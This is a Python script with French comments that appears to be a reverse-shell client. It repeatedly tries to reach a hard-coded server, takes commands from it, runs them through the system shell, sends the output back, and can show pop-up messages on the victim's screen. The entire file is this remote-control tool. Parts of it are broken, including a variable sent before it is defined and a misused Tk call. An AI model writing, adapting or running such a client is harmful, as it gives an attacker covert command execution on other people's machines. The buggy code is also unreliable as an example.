import socket
import time
import os
import subprocess
from tkinter import messagebox
from tkinter import *

# -------------- Constantes --------------
HOST_IP = "127.0.0.1"
HOST_PORT = 3500
MAX_DATA_SIZE = 4000

# --------------- Fonctions ---------------
def send(data):
    s.sendall(data.encode('ascii', errors='ignore'))
    
def listen():
    data_recues = s.recv(MAX_DATA_SIZE)
    return data_recues.decode('ascii', errors='ignore')

def shell_client():
	while True:
		send(os.getcwd())
		command = listen()
		if command == "exit":
			return
		print("Commande : ", command)
		command_split = command.split(" ")
		if len(command_split) == 2 and command_split[0] == "cd":
			try:
				os.chdir(command_split[1])
			except FileNotFoundError:
				print("ERREUR : ce répertoire n'exite pas")
				send("ERREUR : ce répertoire n'exite pas")
		else:
			resultat = subprocess.run(command, shell=True, capture_output=True, universal_newlines=True)  # dir sur PC
			if not resultat.stdout:
				print(resultat.stderr)
				send(resultat.stderr)
			else:
				print(resultat.stdout)
				send(resultat.stdout)
         		
def msg(data):
	t = Tk()
	t.showinfo('Message', data)
	send("Executed")

	
# Connexion au serveur
print(f"Connexion au serveur {HOST_IP}, port {HOST_PORT}")
while True:
	try:
		s = socket.socket()
		s.connect((HOST_IP, HOST_PORT))
	except ConnectionRefusedError:
		print("ERREUR : impossible de se connecter au serveur. Reconnexion... ")
		time.sleep(4)
	else:
		print("Connecté au serveur")
		break

# -------------- Main --------------
while True:
	data = listen()
	command_split = data.split(" ")

	if not data:
		break

	print("Commande : ", data)
	
	header = str(len(data.encode('ascii', errors='ignore'))).zfill(13)
	s.sendall(header.encode('ascii', errors='ignore'))
	s.sendall(resultat.encode('ascii', errors='ignore'))

	if data == "shell":
		shell_client()
		continue

	if len(command_split) == 2 and command_split[0] == "msg":
		msg(command_split[1])
		
  		



s.close()